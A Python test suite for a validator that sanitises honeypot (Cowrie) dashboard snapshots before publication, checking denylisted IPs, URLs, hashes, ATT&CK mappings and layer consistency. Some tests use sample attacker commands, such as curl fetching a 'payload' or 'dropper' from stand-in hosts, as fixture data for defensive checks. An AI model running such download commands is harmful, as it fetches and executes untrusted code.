import importlib.util
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "validate-dashboard.py"
EXPORTER = ROOT / "scripts" / "export-dashboard.py"
FIXTURE = ROOT / "tests" / "fixtures" / "cowrie.json"

spec = importlib.util.spec_from_file_location("validate_dashboard", SCRIPT)
validate_dashboard = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(validate_dashboard)

export_spec = importlib.util.spec_from_file_location("export_dashboard_for_validation", EXPORTER)
export_dashboard = importlib.util.module_from_spec(export_spec)
assert export_spec.loader is not None
export_spec.loader.exec_module(export_dashboard)


class DashboardValidationTests(unittest.TestCase):
    def load(self):
        events, invalid = export_dashboard.load_events(FIXTURE)
        return export_dashboard.build_snapshot(
            events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
            public_endpoint="sensor.example.invalid",
        )

    def load_pair(self):
        snapshot = self.load()
        return snapshot, export_dashboard.navigator_layer(snapshot)

    def test_synthetic_snapshot_passes(self):
        self.assertEqual(validate_dashboard.validate(self.load()), [])

    def test_cli_rejects_snapshot_above_five_megabytes_before_parsing(self):
        with tempfile.TemporaryDirectory() as directory:
            oversized = Path(directory) / "metrics.json"
            oversized.write_bytes(b"{" + b" " * validate_dashboard.MAX_PUBLISHED_FILE_BYTES)
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(oversized)],
                capture_output=True, text=True, check=False,
            )
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("5 MB publication boundary", result.stderr)

    def test_snapshot_rejects_unapproved_top_level_field(self):
        snapshot = self.load()
        snapshot["internal_note"] = "should never be public"
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("unapproved fields" in error for error in errors))

    def test_synthetic_navigator_layer_passes(self):
        snapshot, layer = self.load_pair()
        self.assertEqual(validate_dashboard.validate_layer(layer, snapshot), [])

    def test_operator_denylist_is_enforced(self):
        snapshot = self.load()
        denied = {snapshot["sources"][0]["ip"]}
        errors = validate_dashboard.validate(snapshot, denied)
        self.assertTrue(any("denied operator IP" in error for error in errors))

    def test_raw_cowrie_fields_are_rejected(self):
        snapshot = self.load()
        snapshot["recent"][0]["src_ip"] = snapshot["recent"][0]["ip"]
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("raw Cowrie field" in error for error in errors))

    def test_private_or_unrelated_addresses_are_rejected(self):
        snapshot = self.load()
        snapshot["sources"][0]["ip"] = "10.0.0.7"
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("globally routable" in error for error in errors))

    def test_operator_ip_is_rejected_inside_evidence_text(self):
        snapshot = self.load()
        snapshot["commands"][0]["command"] = "curl http://9.9.9.9/payload"
        errors = validate_dashboard.validate(snapshot, {"9.9.9.9"})
        self.assertTrue(any("denied operator IP" in error for error in errors))

    def test_artifact_hash_and_query_contract_is_enforced(self):
        snapshot = self.load()
        snapshot["artifacts"][0]["sha256"] = "[redacted]"
        snapshot["artifacts"][0]["url"] += "?token=secret"
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("lowercase SHA-256" in error for error in errors))
        self.assertTrue(any("query or fragment" in error for error in errors))

    def test_artifact_url_credentials_are_rejected(self):
        snapshot = self.load()
        snapshot["artifacts"][0]["url"] = "https://operator:secret@payload.example.invalid/dropper"
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("must not contain user information" in error for error in errors))

    def test_withheld_malformed_artifact_url_is_accepted_as_null(self):
        snapshot = self.load()
        snapshot["artifacts"][0]["url"] = None
        self.assertEqual(validate_dashboard.validate(snapshot), [])

    def test_embedded_url_query_is_rejected_outside_artifact_table(self):
        snapshot = self.load()
        snapshot["commands"][0]["command"] = "curl https://payload.example.invalid/dropper?token=secret"
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("unsafe embedded URL" in error for error in errors))

    def test_long_token_is_rejected_outside_hash_field(self):
        snapshot = self.load()
        snapshot["commands"][0]["command"] = "A" * 63 + "_"
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("unredacted sensitive pattern" in error for error in errors))

    def test_correlated_provider_requires_retrieval_time(self):
        snapshot = self.load()
        snapshot["artifacts"][0]["correlation"] = {
            "status": "correlated", "providers": [{
                "name": "MalwareBazaar", "status": "correlated", "label": "FixtureFamily",
                "retrieved_at": None, "report_url": None, "tags": [], "malicious": None,
                "suspicious": None, "harmless": None, "undetected": None,
            }],
        }
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("retrieved_at is invalid" in error for error in errors))

    def test_unavailable_correlation_cannot_contain_available_provider(self):
        snapshot = self.load()
        snapshot["artifacts"][0]["correlation"] = {
            "status": "unavailable", "providers": [{
                "name": "VirusTotal", "status": "not-found", "label": None,
                "retrieved_at": "2026-09-01T12:00:00Z", "report_url": None, "tags": [],
                "malicious": None, "suspicious": None, "harmless": None, "undetected": None,
            }],
        }
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("unavailable state contradicts" in error for error in errors))

    def test_decoy_login_cannot_publish_valid_accounts_mapping(self):
        snapshot = self.load()
        snapshot["mitre"].append({
            "id": "T1078", "name": "Valid Accounts", "tactic": "Initial Access",
            "count": 1, "evidence": [{"value": "decoy accepted", "count": 1, "truncated": False}],
            "evidence_observed": 1, "evidence_published": 1,
        })
        snapshot["summary"]["attack_techniques"] += 1
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("must not be inferred" in error for error in errors))

    def test_unapproved_attack_mapping_is_rejected(self):
        snapshot = self.load()
        snapshot["mitre"].append({
            "id": "T9999", "name": "Invented Technique", "tactic": "Impact",
            "count": 1, "evidence": [{"value": "unsupported", "count": 1, "truncated": False}],
            "evidence_observed": 1, "evidence_published": 1,
        })
        snapshot["summary"]["attack_techniques"] += 1
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("unapproved ATT&CK mapping" in error for error in errors))

    def test_public_endpoint_never_exposes_admin_port(self):
        snapshot = self.load()
        snapshot["sensor"]["public_endpoint"]["services"].append({"protocol": "SSH", "port": 2223})
        errors = validate_dashboard.validate(snapshot)
        self.assertTrue(any("only SSH 22 and TELNET 23" in error for error in errors))

    def test_navigator_layer_must_match_metrics(self):
        snapshot, layer = self.load_pair()
        layer["techniques"][0]["score"] += 1
        layer["techniques"][0]["comment"] = "unrelated evidence"
        errors = validate_dashboard.validate_layer(layer, snapshot)
        self.assertTrue(any("score does not match" in error for error in errors))
        self.assertTrue(any("comment does not match" in error for error in errors))

    def test_navigator_layer_rejects_boolean_score(self):
        snapshot, layer = self.load_pair()
        snapshot["mitre"][0]["count"] = 1
        layer["techniques"][0]["score"] = True
        errors = validate_dashboard.validate_layer(layer, snapshot)
        self.assertTrue(any("score must be a positive integer" in error for error in errors))

    def test_navigator_layer_rejects_extra_fields_and_operator_ip(self):
        snapshot, layer = self.load_pair()
        layer["source_url"] = "https://9.9.9.9/private"
        errors = validate_dashboard.validate_layer(layer, snapshot, {"9.9.9.9"})
        self.assertTrue(any("approved top-level fields" in error for error in errors))
        self.assertTrue(any("denied operator IP" in error for error in errors))

    def test_navigator_layer_technique_set_must_match_metrics(self):
        snapshot, layer = self.load_pair()
        layer["techniques"].pop()
        errors = validate_dashboard.validate_layer(layer, snapshot)
        self.assertTrue(any("technique set does not match" in error for error in errors))


if __name__ == "__main__":
    unittest.main()
